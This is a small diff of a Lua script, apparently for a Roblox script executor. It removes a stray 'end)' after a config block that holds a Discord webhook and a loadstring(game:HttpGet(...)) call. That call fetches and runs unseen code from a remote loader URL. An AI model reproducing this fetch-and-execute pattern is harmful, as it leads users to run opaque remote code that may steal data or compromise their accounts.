@@ -17,6 +17,4 @@ getgenv().Config = {
     ["Webhook"] = "https://discord.com/api/webhooks/123456",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
-
-end)
 end)
